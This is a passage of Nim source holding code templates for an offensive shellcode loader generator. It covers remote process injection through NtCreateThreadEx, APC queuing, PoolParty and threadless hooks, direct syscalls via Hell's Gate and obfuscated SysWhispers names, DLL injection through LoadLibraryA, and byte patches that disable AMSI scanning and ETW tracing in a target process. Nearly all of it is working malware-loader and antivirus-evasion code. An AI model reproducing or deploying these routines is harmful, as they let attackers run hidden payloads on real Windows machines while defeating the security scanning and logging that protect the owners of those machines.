                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                    protectAddress = textStart
                    allocateSize = mbi.RegionSize
                    status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, PAGE_EXECUTE_READ, addr oldProtect)
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
                        else:
                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
                            quit(1)


            when defined(threadless):
                # Use GetRemoteModuleHandle and GetRemoteProcAddress to check for threadlessDLL and threadlessFunction
                # if threadlessDLL == ntdll.dll we can also query the address from the local process as they are equal
                var remoteProc: LPVOID
                if(threadlessDLL == obf("ntdll.dll")):
                    var localHandle = GetModuleHandle(threadlessDLL)
                    if localHandle == 0:
                        when defined(verbose):
                            echo obf("[-] Failed to get handle for local "), threadlessDLL
                        quit(1)
                    var localProc = GetProcAddress(localHandle, threadlessFunction)
                    if localProc == NULL:
                        when defined(verbose):
                            echo obf("[-] Failed to get address of "), threadlessFunction
                        quit(1)
                    when defined(verbose):
                        echo obf("[*] Found address of "), threadlessFunction, obf(" at "), toHex(cast[HANDLE](localProc)), "\r\n"
                    remoteProc = localProc
                else:
                    var remoteHandle = GetRemoteModuleHandle(tProcess, threadlessDLL)
                    if remoteHandle == 0:
                        when defined(verbose):
                            echo obf("[-] Failed to get handle for "), threadlessDLL
                        quit(1)
                    remoteProc = GetRemoteProcAddress(tProcess, remoteHandle, threadlessFunction)
                    if remoteProc == NULL:
                        when defined(verbose):
                            echo obf("[-] Failed to get address of "), threadlessFunction
                        quit(1)
                    when defined(verbose):
                        echo obf("[*] Found address of "), threadlessFunction, obf(" at "), toHex(cast[HANDLE](remoteProc)), "\r\n"
                when defined(logFile):
                    logVerbose(obf("[*] ThreadlessInject2 start") & "\r\n")
                # Call threadlessThread with target process, shellcode address and targetFunction address
                var threadlessSuccess: bool = threadlessThread(tProcess, ds, remoteProc)
                if threadlessSuccess == false:
                    when defined(verbose):
                        echo obf("[-] Failed to create threadless thread")
                    when defined(logFile):
                        logVerbose(obf("[-] Failed to create threadless thread\r\n"))
                    quit(1)
                when defined(verbose):
                    when defined(logFile):
                        logVerbose(obf("[+] Threadless thread created successfully\r\n"))
                    echo obf("[+] Threadless thread created successfully")
                when defined(restore):
                    restoreText()
                quit(0)

            when defined(poolparty):
                when defined(JmpEntry):
                    ds = newEntry
                ExecutePoolparty(tProcess, ds)
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(tProcess, ds)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")
                when defined(restore):
                    restoreText()
                return

            when defined(QueueAPC):
                when defined(Hellsgate):
                    if getSyscall(ntQueueApcThreadTable):
                        syscall = ntQueueApcThreadTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
                when defined(JmpEntry):
                    ds = newEntry
                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](ds)
                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, ds, nil, nil)
                when defined(verbose):
                    echo obf("[*] NtQueueApcThread: "), toHex(status)
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(tProcess, ds)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")
                when defined(restore):
                    restoreText()

            else:
                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                when defined(JmpEntry):
                    ds = newEntry
                status = NtCreateThreadEx(
                    &tHandle, 
                    THREAD_ALL_ACCESS, 
                    NULL, 
                    tProcess,
                    ds, 
                    NULL, FALSE, 0, 0, 0, NULL)
                
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status), " ", repr(ds)
                
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(tProcess, ds)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")
                when defined(restore):
                    restoreText()
                when defined(Hellsgate):
                    if getSyscall(ntCloseTable):
                        syscall = ntCloseTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtClose")
                status = NtClose(tHandle)
                status = NtClose(tProcess)

    

    injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory

when not defined(proxy):
    when defined(defaultMain):
        when not defined(service):
            when not defined(cloned):
                discard main(nil)

"""

let ShellcoderemoteinjectStub_notepad * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = remoteProcID

        when defined(logFile):
            logVerbose(obf("[*] In the Inject function \r\n"))

"""

let ShellcoderemoteinjectStub_customprocfirst * = """

    proc FindPidByName (processName : string):DWORD =
        try:
            var 
                entry : PROCESSENTRY32A
                snapshot : HANDLE
                pid : DWORD = 0
            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot != INVALID_HANDLE_VALUE:
                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
                if Process32FirstA(snapshot,addr entry):
                    while Process32NextA(snapshot,addr entry):
                        pid = entry.th32ProcessID
                        if ($(entry.szExeFile).join()).contains(processName):
                            result = pid
        except: 
            when defined(verbose):
                echo obf("Process ID not found")

    var processID: DWORD
"""

let ShellcoderemoteinjectStub_customprocID * = """
    var found: bool = false
    for m in remoteprocesses:
        if found == true: continue
        when defined(verbose):
            echo obf("Checking: ") & $m
        processID = FindPidByName(m)
        if (processID):
            found = true

    when defined(verbose):
        echo obf("[*] Target Process: "), processID
    var remoteProcID: DWORD = processID
"""

let ShellcoderemoteinjectStub_customprocthird * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

"""


let RemotePatchAMSIStub* = """

    proc RemotePatchAmsi(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x75] # Patch JZ to JNZ
        elif defined i386:
            let patch: array[1, byte] = [byte 0x75] 


        var disabled: bool = false
    
        var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
        if RemoteHandle == 0:
            when defined(verbose):
                echo obf("[X] Failed to get amsi.dll handle")
            return disabled

        var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
        if RemoteProc == NULL:
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
            return disabled
        when defined amd64:
            RemoteProc = RemoteProc + 0x6D
        else:
            RemoteProc = RemoteProc + 0x47
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] oqiazasusjk Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
        
        else:
            when not defined(spawninject):
                when defined(Hellsgate):
                    if getSyscall(ntOpenTable):
                        syscall = ntOpenTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtOpenProcess")
                var hProcss: HANDLE
                var oa2: OBJECT_ATTRIBUTES
                var cid2: CLIENT_ID
                cid2.UniqueProcess = processID
                var statusamsi = NtOpenProcess(
                    &hProcss,
                    PROCESS_QUERY_INFORMATION, 
                    &oa2, &cid2         
                )
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(statusamsi)
                
                when defined(Hellsgate):
                    if getSyscall(ntDuplicateTable):
                        syscall = ntDuplicateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtDuplicateObject")

                # duplicate to get PROCESS_ALL_ACCESS
                var high: HANDLE
                status = NtDuplicateObject(
                    -1, 
                    hProcss, 
                    -1, 
                    &high, 
                    PROCESS_ALL_ACCESS, 
                    FALSE, 
                    0
                )
                when defined(verbose):
                    echo obf("[*] NtDuplicateObject: "), toHex(workedfine)
                hProcss = high
        
        when not defined(spawninject):
            var procHandle2: HANDLE = hProcss
        else:
            var procHandle2: HANDLE = tProcess

        success = RemotePatchAmsi(procHandle2)
        if (success == 0):
            success = remoteLoadAmsi(remoteProcID)
            HowMuchTimeWouldYoulikeToSleep(4)
            success = RemotePatchAmsi(procHandle2)
        when defined(verbose):
            echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

    #amsRemote()

"""

let RemoteLoadDllStub* = """

    proc remoteLoadDll(moduletoInject: cstring, tProcess: HANDLE): bool =

        var
            regionSize: SIZE_T
            ntStatus: NTSTATUS
            ntcode: NTSTATUS
            threadRoutine: PTHREAD_START_ROUTINE
    
        regionSize = 4096

       
        when defined(verbose):
            echo obf("[*] Loading "), moduletoInject, obf(" in the remote process")

        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](moduletoInject.len)

        
        when defined(SysWhispers):
        
            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(tProcess,ds,moduletoInject,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            status = zuatzuastdiasyy(tHandle)
            if(status == 0):
                return true
            else:
                return false
        else:
            
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                tProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", repr(ds)
            var bytesWritten: SIZE_T
            when defined(logFile):
                logVerbose(obf("[*] NtAllocateVirtualMemory for DLL Name: ")& cast[string](toHex(status))& " " & cast[string](repr(ds)) & "\r\n")

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                tProcess, 
                ds, 
                moduletoInject, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
            when defined(verbose):
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(logFile):
                logVerbose(obf("[*] NtWriteVirtualMemory for DLL Name: ")& cast[string](toHex(status))& " " & cast[string](toHex(bytesWritten)) & "\r\n")


            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            
            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                tProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)
            
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            

            when defined(threadless):
        
                # Create a new thread starting at LoadLibraryW with the DLL name buffer address as parameter
                # This will execute LoadLibraryW(L"DLLName") in the remote process
                
                var loadLibraryStk: array[32, byte] = [byte 0x55,               # PUSH RBP
                0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
                0x48, 0x83, 0xEC, 0x30,                                         # SUB RSP, 0x30 : space needed for LoadLibrary to not fuck the stack
                0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # MOV RCX, 0x0000000000000000  -> module name
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # MOV RAX, 0x0000000000000000  -> loadLibraryW address
                0xFF, 0xD0,                                                     # CALL RAX
                0xC9,                                                           # LEAVE
                0xC3
                ]

                moveMemory(unsafeAddr loadLibraryStk[10], &ds, sizeof(DWORD64))
                moveMemory(unsafeAddr loadLibraryStk[20], &pfnThreadRtn, sizeof(DWORD64))

                var loadLibraryAddress : PVOID = nil
                var pageSize: SIZE_T = 32 * sizeof(BYTE)
                var szOutput: SIZE_T
                
                when defined(Hellsgate):
                    if getSyscall(ntAllocTable):
                        syscall = ntAllocTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

                ntcode = NtAllocateVirtualMemory(tProcess, &loadLibraryAddress, 0, &pageSize, MEM_COMMIT, PAGE_READWRITE)
                if (ntcode == 0):
                    when defined(verbose):
                        echo "[+] Allocate memory for loadLibrary Shellcode success"
                
                when defined(logFile):
                    logVerbose(obf("[*] NtAllocateVirtualMemory for LoadLibrary: ")& cast[string](toHex(ntcode))& " " & cast[string](repr(loadLibraryAddress)) & "\r\n")


                when defined(Hellsgate):
                    if getSyscall(ntWriteTable):
                        syscall = ntWriteTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                var addresstoWrite: PVOID = loadLibraryAddress
                pageSize = 32 * sizeof(BYTE)
                ntcode = NtWriteVirtualMemory(tProcess, addresstoWrite, unsafeAddr loadLibraryStk[0], pageSize, &szOutput)
                if (ntcode == 0):
                    when defined(verbose):
                        echo "[+] Write Shellcode success"
                
                when defined(logFile):
                    logVerbose(obf("[*] NtWriteVirtualMemory for LoadLibrary: ")& cast[string](toHex(ntcode))& " " & cast[string](toHex(szOutput)) & "\r\n")

                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                
                var protectionRXAddress: PVOID = loadLibraryAddress
                ntcode = NtProtectVirtualMemory(tProcess, &protectionRXAddress, &pageSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
                if (ntcode == 0):
                    when defined(verbose):
                        echo "[+] Re-Protected to RX success"
                when defined(verbose):
                    echo "[+] LoadLibraryW shellcode written at : ", repr(protectionRXAddress)
                
                when defined(logFile):
                    logVerbose(obf("[*] NtProtectVirtualMemory for LoadLibrary: ")& cast[string](toHex(ntcode))& " " & cast[string](toHex(szOutput)) & "\r\n")
                
                var threadlessRoutine: LPVOID = nil
                if (threadlessDLL == obf("ntdll.dll")):
                    # get module from local proc and GetProcAddress for the function afterwards as its the same
                    var remoteModHandle: HMODULE = GetModuleHandle(threadlessDLL)

                    if (remoteModHandle == 0):
                        when defined(verbose):
                            echo "[-] Cannot retrieve module"
                        when defined(logFile):
                            logVerbose(obf("[-] Cannot retrieve module") & "\r\n")
                        return false

                    threadlessRoutine = cast[LPVOID](GetProcAddress(remoteModHandle, threadlessFunction))
                    if(threadlessRoutine == nil):
                        when defined(verbose):
                            echo "[-] Cannot retrieve function"
                        when defined(logFile):
                            logVerbose(obf("[-] Cannot retrieve function") & "\r\n")
                        return false
                else:

                    var remoteModHandle: HMODULE = GetRemoteModuleHandle(tProcess, threadlessDLL)
                    if (remoteModHandle == 0):
                        when defined(verbose):
                            echo "[-] Cannot retrieve module"
                        when defined(logFile):
                            logVerbose(obf("[-] Cannot retrieve module") & "\r\n")
                        return false

                    threadlessRoutine = cast[LPVOID](GetRemoteProcAddress(tProcess, remoteModHandle, threadlessFunction))
                    when defined(verbose):
                        echo "[*] Threadless routine: ", repr(threadlessRoutine)

                when defined(logFile):
                        logVerbose(obf("[*] Starting ThreadlessInject") & "\r\n")
                var threadSuccess = threadlessThread(tProcess, loadLibraryAddress, threadlessRoutine)
                when defined(verbose):
                    echo "Threadless inject success: ", threadSuccess
                when defined(logFile):
                    logVerbose(obf("[*] ThreadlessInject success: ") & cast[string](toHex(threadSuccess)) & "\r\n")
                

                status = NtFreeVirtualMemory(tProcess, &loadLibraryAddress, &pageSize, MEM_DECOMMIT or MEM_RELEASE)
                if (status == 0):
                    when defined(verbose):
                        echo "[+] Free memory success"
                    else:
                        when defined(verbose):
                            echo "[-] Free memory failed"
                Sleep(500)
                return threadSuccess
            else:

                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")

                status = NtCreateThreadEx(
                    &tHandle, 
                    THREAD_ALL_ACCESS, 
                    NULL, 
                    tProcess,
                    pfnThreadRtn, 
                    ds, FALSE, 0, 0, 0, NULL)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
                #status = NtClose(tHandle)
                Sleep(500)
                if(status == 0):
                    return true
                else:
                    return false

"""

let RemoteLoadAMSIStub* = """

    proc remoteLoadAmsi(processID: var DWORD): bool =

    
        # C:\windows\system32\amsi.dll
        var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
        char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
        char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
        
        when defined(verbose):
            echo obf("[*] Loading amsi.dll in the remote process: "), processID
        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
                
                # duplicate to get PROCESS_ALL_ACCESS
                var high: HANDLE
                let workedfine = DuplicateHandle(
                    -1, 
                    tProcess, 
                    -1, 
                    &high, 
                    PROCESS_ALL_ACCESS, 
                    FALSE, 
                    0
                )
                when defined(verbose):
                    echo obf("[*] DuplicateHandle: "), toHex(workedfine)
                tProcess = high


            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            status = zuatzuastdiasyy(tHandle)
            if(status == 0):
                return true
            else:
                return false
        else:
            
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            when not defined(spawninject):
                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
                
                # duplicate to get PROCESS_ALL_ACCESS
                when defined(Hellsgate):
                    if getSyscall(ntDuplicateTable):
                        syscall = ntDuplicateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
                var high: HANDLE
                status = NtDuplicateObject(
                    -1, 
                    tProcess, 
                    -1, 
                    &high, 
                    PROCESS_ALL_ACCESS, 
                    FALSE, 
                    0
                )
                when defined(verbose):
                    echo obf("[*] NtDuplicateObject: "), toHex(status)
                tProcess = high


            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                tProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                tProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
            when defined(verbose):
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            
            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                tProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)
            
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                tProcess,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            status = NtClose(tHandle)
            
            if(status == 0):
                return true
            else:
                return false


"""



let RemotePatchETWStub* = """


    proc RemotePatchETW(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        elif defined i386:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112


        var disabled: bool = false
        
        # local process and remote process ntdll.dll addresses are equal.
        when defined(DInvoke):
            var ntdlldll = MyGetModuleHandleA(obf("ntdll.dll"))
        else:
            var ntdlldll = GetModuleHandleA(obf("ntdll.dll"))
    
        when defined(DInvoke):
            var RemoteProc = MyGetProcAddress(ntdlldll, obf("NtTraceEvent"))
        else:
            var RemoteProc = GetProcAddress(ntdlldll,"NtTraceEvent")
        if isNil(RemoteProc):
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'NtTraceEvent'")

        
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
